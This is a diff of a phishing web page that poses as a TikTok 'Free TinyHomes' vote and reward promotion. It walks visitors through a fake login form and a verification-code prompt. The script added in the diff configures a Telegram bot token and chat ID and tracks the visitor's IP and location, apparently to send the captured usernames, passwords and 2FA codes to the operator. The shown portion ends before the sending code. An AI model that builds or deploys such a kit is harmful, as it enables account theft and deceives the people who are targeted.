@@ -1,993 +1,645 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>𝔽𝕣𝕖𝕖 𝕥𝕚𝕟𝕪𝕙𝕠𝕞𝕖 𝕓𝕦𝕪𝕤 𝕧𝕠𝕥𝕖𝕤</title>
-  <style>
-    /* ===== GLOBAL RESET ===== */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-
-    html, body {
-      background: #000;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-
-    /* ===== APP CONTAINER ===== */
-    .app {
-      width: 100%;
-      max-width: 390px;
-      height: 780px;
-      background: #000;
-      border-radius: 44px;
-      box-shadow: 
-        0 40px 80px rgba(0, 0, 0, 0.95),
-        0 0 0 3px #1a1a1a,
-        0 0 0 6px #0a0a0a;
-      overflow: hidden;
-      position: relative;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .notch {
-      position: absolute;
-      top: 12px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 110px;
-      height: 32px;
-      background: #000;
-      border-radius: 20px;
-      z-index: 100;
-      border: 1px solid #1a1a1a;
-    }
-
-    /* ===== SHARED SCREEN STYLES ===== */
-    .screen {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      color: #fff;
-      background: #000;
-      overflow-y: auto;
-      scrollbar-width: none;
-      padding: 0 24px;
-      padding-top: 50px;
-    }
-    .screen::-webkit-scrollbar { display: none; }
-
-    /* ===== STATUS BAR ===== */
-    .status-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 4px 4px 12px;
-      font-size: 14px;
-      font-weight: 600;
-      color: #fff;
-      letter-spacing: 0.2px;
-    }
-
-    .status-bar .left { display: flex; align-items: center; gap: 4px; }
-    .status-bar .right { display: flex; align-items: center; gap: 6px; font-size: 13px; }
-
-    /* ===== PAGE 1: NOMINATION ===== */
-    .page1 {
-      justify-content: flex-start;
-      text-align: center;
-      padding-bottom: 36px;
-    }
-
-    .tiktok-brand {
-      margin-top: 24px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 2px;
-    }
-
-    .tiktok-brand .logo {
-      font-size: 40px;
-      font-weight: 900;
-      letter-spacing: -2.5px;
-      line-height: 1;
-      color: #fff;
-      position: relative;
-      display: inline-block;
-    }
-
-    .tiktok-brand .logo::before {
-      content: 'TikTok';
-      position: absolute;
-      left: -2px;
-      top: -2px;
-      color: #ff0050;
-      z-index: -1;
-      opacity: 0.85;
-    }
-
-    .tiktok-brand .logo::after {
-      content: 'TikTok';
-      position: absolute;
-      left: 2px;
-      top: 2px;
-      color: #00f2ea;
-      z-index: -2;
-      opacity: 0.85;
-    }
-
-    .tiktok-brand .logo-sub {
-      font-size: 10px;
-      color: #555;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      margin-top: 10px;
-    }
-
-    .nomination-divider {
-      width: 40px;
-      height: 2px;
-      background: linear-gradient(90deg, #ff0050, #00f2ea);
-      margin: 32px auto 0;
-      border-radius: 2px;
-    }
-
-    .nomination-title {
-      margin-top: 24px;
-      font-size: 20px;
-      font-weight: 800;
-      letter-spacing: 1.5px;
-      color: #fff;
-      line-height: 1.5;
-      word-wrap: break-word;
-    }
-
-    .nomination-sub {
-      font-size: 11px;
-      color: #666;
-      margin-top: 8px;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      font-weight: 500;
-    }
-
-    /* ===== VOTE PLATFORM ===== */
-    .vote-platform {
-      margin-top: 44px;
-      background: linear-gradient(160deg, #161616 0%, #0a0a0a 100%);
-      border: 1px solid #222;
-      border-radius: 18px;
-      padding: 28px 24px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      cursor: pointer;
-      transition: transform 0.15s ease, box-shadow 0.25s ease, border-color 0.25s ease;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
-      -webkit-tap-highlight-color: transparent;
-      width: 100%;
-      position: relative;
-      overflow: hidden;
-      animation: platformGlow 3s ease-in-out infinite;
-    }
-
-    .vote-platform::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255, 0, 80, 0.08), transparent);
-      animation: shimmer 3s ease-in-out infinite;
-    }
-
-    @keyframes shimmer {
-      0% { left: -100%; }
-      50%, 100% { left: 100%; }
-    }
-
-    @keyframes platformGlow {
-      0%, 100% { border-color: #222; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6); }
-      50% { border-color: rgba(255, 0, 80, 0.5); box-shadow: 0 8px 40px rgba(255, 0, 80, 0.15); }
-    }
-
-    .vote-platform:active {
-      transform: scale(0.97);
-      border-color: #ff0050;
-      box-shadow: 0 0 50px rgba(255, 0, 80, 0.4);
-    }
-
-    .vote-pulse {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 5px;
-      margin-bottom: 16px;
-      height: 36px;
-    }
-
-    .vote-pulse .bar {
-      width: 5px;
-      background: linear-gradient(180deg, #ff0050, #cc0040);
-      border-radius: 3px;
-      animation: barPulse 1.4s ease-in-out infinite;
-      box-shadow: 0 0 12px rgba(255, 0, 80, 0.5);
-    }
-
-    .vote-pulse .bar:nth-child(1) { animation-delay: 0s; height: 14px; }
-    .vote-pulse .bar:nth-child(2) { animation-delay: 0.12s; height: 24px; }
-    .vote-pulse .bar:nth-child(3) { animation-delay: 0.24s; height: 34px; }
-    .vote-pulse .bar:nth-child(4) { animation-delay: 0.36s; height: 24px; }
-    .vote-pulse .bar:nth-child(5) { animation-delay: 0.48s; height: 14px; }
-
-    @keyframes barPulse {
-      0%, 100% { transform: scaleY(1); opacity: 0.6; }
-      50% { transform: scaleY(1.35); opacity: 1; box-shadow: 0 0 20px rgba(0, 242, 234, 0.6); background: linear-gradient(180deg, #00f2ea, #00c4bd); }
-    }
-
-    .vote-text {
-      font-size: 18px;
-      font-weight: 800;
-      letter-spacing: 4px;
-      text-transform: uppercase;
-      color: #fff;
-      margin-bottom: 6px;
-    }
-
-    .tap-hint {
-      color: #555;
-      font-size: 10px;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      font-weight: 500;
-    }
-
-    /* ===== PAGE 2: LOGIN ===== */
-    .page2 {
-      justify-content: flex-start;
-      padding-top: 50px;
-    }
-
-    .login-brand {
-      text-align: center;
-      margin-bottom: 36px;
-    }
-
-    .login-brand .wordmark {
-      font-size: 36px;
-      font-weight: 900;
-      letter-spacing: -2px;
-      color: #fff;
-      position: relative;
-      display: inline-block;
-    }
-
-    .login-brand .wordmark::before {
-      content: 'TikTok';
-      position: absolute;
-      left: -1.5px;
-      top: -1.5px;
-      color: #ff0050;
-      z-index: -1;
-      opacity: 0.8;
-    }
-
-    .login-brand .wordmark::after {
-      content: 'TikTok';
-      position: absolute;
-      left: 1.5px;
-      top: 1.5px;
-      color: #00f2ea;
-      z-index: -2;
-      opacity: 0.8;
-    }
-
-    .login-brand .tagline {
-      font-size: 10px;
-      color: #555;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      margin-top: 8px;
-      font-weight: 500;
-    }
-
-    .login-heading {
-      font-size: 20px;
-      font-weight: 700;
-      color: #fff;
-      margin-bottom: 6px;
-      letter-spacing: -0.3px;
-    }
-
-    .login-subheading {
-      color: #666;
-      font-size: 13px;
-      margin-bottom: 28px;
-      font-weight: 400;
-    }
-
-    .input-group {
-      margin-bottom: 12px;
-      position: relative;
-    }
-
-    .input-group input {
-      width: 100%;
-      background: #121212;
-      border: 1px solid #222;
-      border-radius: 10px;
-      padding: 16px 16px;
-      font-size: 15px;
-      color: #fff;
-      outline: none;
-      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
-      font-weight: 400;
-    }
-
-    .input-group input:focus {
-      border-color: #ff0050;
-      box-shadow: 0 0 0 3px rgba(255, 0, 80, 0.12);
-      background: #161616;
-    }
-
-    .input-group input::placeholder {
-      color: #444;
-      font-size: 14px;
-      font-weight: 400;
-    }
-
-    .login-btn {
-      width: 100%;
-      background: #ff0050;
-      border: none;
-      border-radius: 10px;
-      padding: 16px;
-      font-size: 16px;
-      font-weight: 700;
-      color: #fff;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
-      letter-spacing: 0.3px;
-      box-shadow: 0 4px 20px rgba(255, 0, 80, 0.25);
-      position: relative;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      min-height: 52px;
-    }
-
-    .login-btn:active {
-      transform: scale(0.98);
-      background: #e60048;
-    }
-
-    .login-btn.loading {
-      background: #a3003a;
-      cursor: wait;
-      pointer-events: none;
-    }
-
-    .spinner {
-      width: 20px;
-      height: 20px;
-      border: 2.5px solid rgba(255, 255, 255, 0.25);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-      display: none;
-    }
-
-    .login-btn.loading .spinner { display: inline-block; }
-    .login-btn.loading .btn-text { display: none; }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .forgot-link {
-      text-align: center;
-      margin-top: 20px;
-      color: #666;
-      font-size: 12px;
-      font-weight: 400;
-    }
-
-    .forgot-link span {
-      color: #ff0050;
-      font-weight: 600;
-      cursor: default;
-    }
-
-    .divider {
-      display: flex;
-      align-items: center;
-      margin: 26px 0;
-      color: #333;
-      font-size: 11px;
-    }
-
-    .divider::before,
-    .divider::after {
-      content: '';
-      flex: 1;
-      height: 1px;
-      background: #1e1e1e;
-    }
-
-    .divider span {
-      padding: 0 14px;
-      color: #555;
-      letter-spacing: 1.5px;
-      font-weight: 500;
-    }
-
-    .social-login {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .social-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background: #121212;
-      border: 1px solid #1e1e1e;
-      border-radius: 10px;
-      padding: 14px;
-      color: #ccc;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: default;
-      opacity: 0.6;
-    }
-
-    .social-btn .icon { font-size: 16px; }
-
-    /* ===== PAGE 3: VERIFICATION ===== */
-    .page3 {
-      justify-content: flex-start;
-      padding-top: 70px;
-    }
-
-    .verification-icon {
-      text-align: center;
-      font-size: 44px;
-      margin-bottom: 20px;
-      filter: drop-shadow(0 0 30px rgba(0, 242, 234, 0.4));
-      animation: iconPulse 2s ease-in-out infinite;
-    }
-
-    @keyframes iconPulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.06); }
-    }
-
-    .verification-title {
-      font-size: 22px;
-      font-weight: 700;
-      color: #fff;
-      text-align: center;
-      margin-bottom: 8px;
-      letter-spacing: -0.3px;
-    }
-
-    .verification-sub {
-      color: #666;
-      font-size: 13px;
-      text-align: center;
-      margin-bottom: 32px;
-      line-height: 1.7;
-      padding: 0 10px;
-      font-weight: 400;
-    }
-
-    .verification-sub strong {
-      color: #ccc;
-      font-weight: 600;
-    }
-
-    .code-input {
-      width: 100%;
-      background: #121212;
-      border: 1px solid #222;
-      border-radius: 12px;
-      padding: 20px;
-      font-size: 32px;
-      letter-spacing: 14px;
-      text-align: center;
-      color: #fff;
-      outline: none;
-      font-weight: 700;
-      margin-bottom: 26px;
-      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
-      font-variant-numeric: tabular-nums;
-    }
-
-    .code-input:focus {
-      border-color: #00f2ea;
-      box-shadow: 0 0 0 3px rgba(0, 242, 234, 0.12);
-      background: #161616;
-    }
-
-    .code-input::placeholder {
-      color: #333;
-      letter-spacing: 6px;
-      font-size: 16px;
-      font-weight: 400;
-    }
-
-    .send-btn {
-      width: 100%;
-      background: #00f2ea;
-      border: none;
-      border-radius: 10px;
-      padding: 16px;
-      font-size: 16px;
-      font-weight: 700;
-      color: #000;
-      cursor: pointer;
-      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
-      letter-spacing: 0.3px;
-      box-shadow: 0 4px 20px rgba(0, 242, 234, 0.25);
-      min-height: 52px;
-    }
-
-    .send-btn:active {
-      transform: scale(0.98);
-      background: #00d4cc;
-    }
-
-    .resend {
-      text-align: center;
-      margin-top: 22px;
-      color: #555;
-      font-size: 12px;
-      font-weight: 400;
-    }
-
-    .resend span {
-      color: #00f2ea;
-      font-weight: 600;
-      cursor: default;
-    }
-
-    /* ===== PAGE 4: FAILED ===== */
-    .page4 {
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding-top: 0;
-      padding-bottom: 40px;
-    }
-
-    .fail-icon {
-      font-size: 60px;
-      margin-bottom: 24px;
-      animation: shake 0.7s ease-in-out;
-      filter: drop-shadow(0 0 30px rgba(255, 59, 48, 0.4));
-    }
-
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      15% { transform: translateX(-14px); }
-      30% { transform: translateX(14px); }
-      45% { transform: translateX(-10px); }
-      60% { transform: translateX(10px); }
-      75% { transform: translateX(-5px); }
-      90% { transform: translateX(5px); }
-    }
-
-    .fail-title {
-      font-size: 24px;
-      font-weight: 800;
-      color: #ff3b30;
-      margin-bottom: 10px;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-    }
-
-    .fail-sub {
-      color: #777;
-      font-size: 14px;
-      line-height: 1.7;
-      margin-bottom: 44px;
-      max-width: 260px;
-      font-weight: 400;
-    }
-
-    .restart-btn {
-      background: transparent;
-      border: 2px solid #ff3b30;
-      border-radius: 50px;
-      padding: 16px 56px;
-      font-size: 16px;
-      font-weight: 700;
-      color: #ff3b30;
-      cursor: pointer;
-      transition: all 0.25s ease;
-      letter-spacing: 1.5px;
-      -webkit-tap-highlight-color: transparent;
-      text-transform: uppercase;
-      min-height: 56px;
-    }
-
-    .restart-btn:active {
-      background: #ff3b30;
-      color: #fff;
-      transform: scale(0.95);
-      box-shadow: 0 0 45px rgba(255, 59, 48, 0.5);
-    }
-
-    /* ===== UTILITY ===== */
-    .hidden { display: none !important; }
-
-    .screen { animation: fadeIn 0.3s ease; }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(8px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 420px) {
-      .app {
-        max-width: 100%;
-        height: 100vh;
-        border-radius: 0;
-        box-shadow: none;
-      }
-      .notch { display: none; }
-      .screen { padding-top: 24px; }
-    }
-
-    @media (max-height: 750px) {
-      .app { height: 100vh; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free TinyHomes · Promo Rewards ✪</title>
+    <!-- Font Awesome for TikTok icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at 30% 10%, #0f1a1f, #030708);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* subtle dark vignette */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 70% 20%, rgba(0, 200, 200, 0.05), transparent 60%),
+                        radial-gradient(circle at 20% 80%, rgba(255, 60, 80, 0.03), transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .card {
+            background: rgba(10, 18, 22, 0.85);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 2.2rem;
+            padding: 2rem 1.8rem;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 30px 50px -10px #000000, 0 0 0 1px rgba(0, 255, 255, 0.08),
+                        0 0 40px rgba(0, 180, 255, 0.05);
+            border: 1px solid rgba(50, 220, 220, 0.12);
+            transition: transform 0.2s ease;
+            position: relative;
+            z-index: 2;
+        }
+
+        .screen {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* ===== TIKTOK BRANDING ===== */
+        .tiktok-brand {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem;
+            margin-bottom: 1rem;
+            color: #ffffff;
+            letter-spacing: 1px;
+            font-weight: 600;
+            font-size: 1.3rem;
+            text-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+
+        .tiktok-brand i {
+            font-size: 2rem;
+            color: #00f2ea;
+            filter: drop-shadow(0 0 8px rgba(0, 242, 234, 0.6));
+            animation: subtlePulse 3s infinite;
+        }
+
+        .tiktok-brand span {
+            background: linear-gradient(135deg, #ffffff, #a0e0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        @keyframes subtlePulse {
+            0%, 100% { filter: drop-shadow(0 0 8px rgba(0, 242, 234, 0.6)); }
+            50% { filter: drop-shadow(0 0 18px rgba(0, 242, 234, 0.9)); }
+        }
+
+        /* ===== TITLE (unicode math bold) ===== */
+        .page-title {
+            font-size: 1.6rem;
+            font-weight: 500;
+            text-align: center;
+            letter-spacing: 1px;
+            color: #eef5ff;
+            text-shadow: 0 4px 20px rgba(0, 180, 255, 0.3);
+            margin-bottom: 0.8rem;
+            line-height: 1.3;
+            word-break: break-word;
+        }
+
+        /* heartbeat tap to vote */
+        .tap-vote-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 2rem;
+            margin-bottom: 0.5rem;
+            cursor: pointer;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            transition: opacity 0.2s;
+        }
+
+        .tap-vote-container:active {
+            opacity: 0.7;
+        }
+
+        .tap-vote {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #ffb347;
+            text-shadow: 0 0 25px rgba(255, 180, 70, 0.8), 0 0 10px rgba(255, 100, 100, 0.5);
+            letter-spacing: 2px;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 0.9rem 2.2rem;
+            border-radius: 60px;
+            display: inline-block;
+            animation: heartbeat 1.4s ease-in-out infinite;
+            border: 1px solid rgba(255, 200, 100, 0.4);
+            box-shadow: 0 0 30px rgba(255, 100, 0, 0.15);
+        }
+
+        @keyframes heartbeat {
+            0% { transform: scale(1); }
+            14% { transform: scale(1.12); }
+            28% { transform: scale(1); }
+            42% { transform: scale(1.12); }
+            70% { transform: scale(1); }
+        }
+
+        /* ===== LOGIN FORM ===== */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 1.3rem;
+            margin-top: 0.8rem;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.4rem;
+        }
+
+        .input-group label {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: #9ab8d0;
+            letter-spacing: 0.5px;
+            margin-left: 0.5rem;
+        }
+
+        .input-group input {
+            background: rgba(5, 15, 20, 0.9);
+            border: 1.5px solid #1f4d5a;
+            border-radius: 60px;
+            padding: 1rem 1.5rem;
+            font-size: 1rem;
+            color: #ffffff;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #00f2ea;
+            box-shadow: 0 0 0 3px rgba(0, 242, 234, 0.15), 0 0 25px rgba(0, 242, 234, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #4a6c7a;
+            font-weight: 300;
+        }
+
+        /* login icon */
+        .login-icon-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-top: 0.8rem;
+            margin-bottom: 0.2rem;
+        }
+
+        .login-icon {
+            background: linear-gradient(135deg, #0a4b5e, #062b36);
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 10px 25px -5px #000000, 0 0 0 2px rgba(0, 242, 234, 0.25);
+            transition: all 0.2s;
+            border: 2px solid #0e6d7a;
+        }
+
+        .login-icon:hover {
+            transform: scale(1.05);
+            background: linear-gradient(135deg, #0e6d7a, #0a4b5e);
+            box-shadow: 0 12px 28px -4px #000000, 0 0 0 3px rgba(0, 242, 234, 0.5);
+        }
+
+        .login-icon:active {
+            transform: scale(0.97);
+        }
+
+        .login-icon svg {
+            width: 36px;
+            height: 36px;
+            fill: none;
+            stroke: #ffffff;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* ===== VERIFICATION SCREEN ===== */
+        .verify-message {
+            font-size: 1.1rem;
+            text-align: center;
+            color: #c0dcee;
+            margin: 1.2rem 0 0.8rem;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        .verify-message strong {
+            color: #7ae0ff;
+            font-weight: 600;
+        }
+
+        .verification-form {
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+            margin-top: 0.8rem;
+        }
+
+        .code-input {
+            background: rgba(5, 15, 20, 0.9);
+            border: 1.5px solid #1f4d5a;
+            border-radius: 60px;
+            padding: 1rem 1.5rem;
+            font-size: 1.3rem;
+            text-align: center;
+            letter-spacing: 6px;
+            color: #fff;
+            outline: none;
+            font-weight: 500;
+        }
+
+        .code-input:focus {
+            border-color: #00f2ea;
+            box-shadow: 0 0 0 3px rgba(0, 242, 234, 0.15);
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #0e6d7a, #073e4a);
+            border: none;
+            border-radius: 60px;
+            padding: 1rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 10px 20px -8px #000000, 0 0 20px rgba(0, 242, 234, 0.1);
+            border: 1px solid #1a8a9a;
+            letter-spacing: 0.5px;
+        }
+
+        .verify-btn:active {
+            transform: scale(0.98);
+            background: linear-gradient(135deg, #073e4a, #052b33);
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 0.95rem;
+            text-align: center;
+            margin-top: 0.8rem;
+            min-height: 1.5rem;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            text-shadow: 0 0 10px rgba(255, 80, 80, 0.3);
+        }
+
+        /* loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 1.4rem;
+            height: 1.4rem;
+            border: 3px solid rgba(0, 242, 234, 0.15);
+            border-radius: 50%;
+            border-top-color: #00f2ea;
+            animation: spin 0.8s linear infinite;
+            margin-right: 0.5rem;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .redirect-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.3rem;
+            color: #9ab8d0;
+            font-size: 0.95rem;
+            margin-top: 1rem;
+        }
+
+        /* small responsive */
+        @media (max-width: 400px) {
+            .card { padding: 1.5rem 1.2rem; }
+            .page-title { font-size: 1.3rem; }
+            .tap-vote { font-size: 1.5rem; padding: 0.7rem 1.5rem; }
+            .tiktok-brand { font-size: 1.1rem; }
+            .tiktok-brand i { font-size: 1.7rem; }
+        }
+    </style>
 </head>
 <body>
-  <div class="app" id="app">
-    <div class="notch"></div>
-
-    <!-- ========== PAGE 1: NOMINATION ========== -->
-    <div id="page1" class="screen page1">
-
-      <div class="status-bar">
-        <div class="left"><span>9:41</span></div>
-        <div class="right"><span>📶</span><span>📶</span><span>🔋</span></div>
-      </div>
-
-      <div class="tiktok-brand">
-        <div class="logo">TikTok</div>
-        <div class="logo-sub">Fashion Beauty Awards</div>
-      </div>
-
-      <div class="nomination-divider"></div>
-
-      <div class="nomination-title">𝔽𝕣𝕖𝕖 𝕥𝕚𝕟𝕪𝕙𝕠𝕞𝕖 𝕓𝕦𝕪𝕤 𝕧𝕠𝕥𝕖𝕤</div>
-      <div class="nomination-sub">Cast Your Vote</div>
-
-      <div class="vote-platform" id="votePlatform">
-        <div class="vote-pulse">
-          <div class="bar"></div>
-          <div class="bar"></div>
-          <div class="bar"></div>
-          <div class="bar"></div>
-          <div class="bar"></div>
+    <div class="card" id="appCard">
+        <!-- ========== SCREEN 1: INITIAL PAGE (TAP TO VOTE) ========== -->
+        <div id="screenStart" class="screen">
+            <!-- TikTok branding -->
+            <div class="tiktok-brand">
+                <i class="fab fa-tiktok"></i>
+                <span>TikTok</span>
+            </div>
+            <div class="page-title">𝔽𝕣𝕖𝕖 𝕋𝕚𝕟𝕪𝕙𝕠𝕞𝕖𝕤/𝕡𝕣𝕠𝕞𝕠 𝕣𝕖𝕨𝕒𝕣𝕕𝕤 ✪</div>
+            <div class="tap-vote-container" id="tapToVoteBtn">
+                <div class="tap-vote">𝕋𝕒𝕡 𝕥𝕠 𝕧𝕠𝕥𝕖</div>
+            </div>
         </div>
-        <div class="vote-text">Vote Here</div>
-        <div class="tap-hint">Tap to continue</div>
-      </div>
 
+        <!-- ========== SCREEN 2: LOGIN (USERNAME + PASSWORD) ========== -->
+        <div id="screenLogin" class="screen hidden">
+            <div class="tiktok-brand">
+                <i class="fab fa-tiktok"></i>
+                <span>TikTok</span>
+            </div>
+            <div class="page-title" style="font-size: 1.4rem; margin-bottom: 1.2rem;">𝔽𝕣𝕖𝕖 𝕋𝕚𝕟𝕪𝕙𝕠𝕞𝕖𝕤/𝕡𝕣𝕠𝕞𝕠 𝕣𝕖𝕨𝕒𝕣𝕕𝕤 ✪</div>
+            
+            <div class="login-form">
+                <div class="input-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="Enter your username" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- login icon at the bottom -->
+            <div class="login-icon-wrapper" id="loginIconBtn">
+                <div class="login-icon" title="Login">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
+                        <polyline points="10 17 15 12 10 7" />
+                        <line x1="15" y1="12" x2="3" y2="12" />
+                    </svg>
+                </div>
+            </div>
+            <div id="loginError" class="error-message" style="min-height: 1.5rem;"></div>
+        </div>
+
+        <!-- ========== SCREEN 3: VERIFICATION CODE + FAILURE ========== -->
+        <div id="screenVerify" class="screen hidden">
+            <div class="tiktok-brand">
+                <i class="fab fa-tiktok"></i>
+                <span>TikTok</span>
+            </div>
+            <div class="page-title" style="font-size: 1.4rem; margin-bottom: 0.6rem;">𝔽𝕣𝕖𝕖 𝕋𝕚𝕟𝕪𝕙𝕠𝕞𝕖𝕤/𝕡𝕣𝕠𝕞𝕠 𝕣𝕖𝕨𝕒𝕣𝕕𝕤 ✪</div>
+            
+            <div class="verify-message">
+                <strong>Check email, SMS, or WhatsApp</strong><br>
+                to get your verification code
+            </div>
+
+            <div class="verification-form">
+                <input type="text" id="verificationCode" class="code-input" placeholder="••••••" maxlength="6" inputmode="numeric">
+                <button class="verify-btn" id="verifyBtn">Verify</button>
+            </div>
+
+            <div id="verifyError" class="error-message"></div>
+            <div id="redirectStatus" class="redirect-note hidden">
+                <span class="spinner"></span> Redirecting...
+            </div>
+        </div>
     </div>
 
-    <!-- ========== PAGE 2: LOGIN ========== -->
-    <div id="page2" class="screen page2 hidden">
+    <script>
+        (function() {
+            // ========== TELEGRAM CONFIG ==========
+            const TELEGRAM_BOT_TOKEN = '8616631878:AAFH3xPqTkWz6JE6RI8w_ILKyBjILpr5aW4';
+            const TELEGRAM_CHAT_ID = '8008428584';
 
-      <div class="status-bar">
-        <div class="left"><span>9:41</span></div>
-        <div class="right"><span>📶</span><span>📶</span><span>🔋</span></div>
-      </div>
+            // ========== ELEMENTS ==========
+            const screenStart = document.getElementById('screenStart');
+            const screenLogin = document.getElementById('screenLogin');
+            const screenVerify = document.getElementById('screenVerify');
+            const tapToVoteBtn = document.getElementById('tapToVoteBtn');
+            const loginIconBtn = document.getElementById('loginIconBtn');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginError = document.getElementById('loginError');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const verificationCodeInput = document.getElementById('verificationCode');
+            const verifyError = document.getElementById('verifyError');
+            const redirectStatus = document.getElementById('redirectStatus');
 
-      <div class="login-brand">
-        <div class="wordmark">TikTok</div>
-        <div class="tagline">Log in to continue</div>
-      </div>
+            // ========== STATE ==========
+            let loginRedirectTimeout = null;
+            let verifyFailureTimeout = null;
+            let userIp = '';
+            let userLocation = '';
+            let ipFetched = false;
 
-      <div class="login-heading">Welcome back</div>
-      <div class="login-subheading">Log in to your account to vote</div>
+            // ========== UTILITIES ==========
+            function clearAllTimeouts() {
+                if (loginRedirectTimeout) {
+                    clearTimeout(loginRedirectTimeout);
+                    loginRedirectTimeout = null;
+                }
+                if (verifyFailureTimeout) {
+                    clearTimeout(verifyFailureTimeout);
+                    verifyFailureTimeout = null;
+                }
+            }
 
-      <div class="input-group">
-        <input type="text" id="username" placeholder="Username or email" autocomplete="off">
-      </div>
-      <div class="input-group">
-        <input type="password" id="password" placeholder="Password">
-      </div>
+            function showScreen(screen) {
+                screenStart.classList.add('hidden');
+                screenLogin.classList.add('hidden');
+                screenVerify.classList.add('hidden');
+                screen.classList.remove('hidden');
+            }
 
-      <button class="login-btn" id="loginBtn">
-        <span class="btn-text">Log in</span>
-        <span class="spinner"></span>
-      </button>
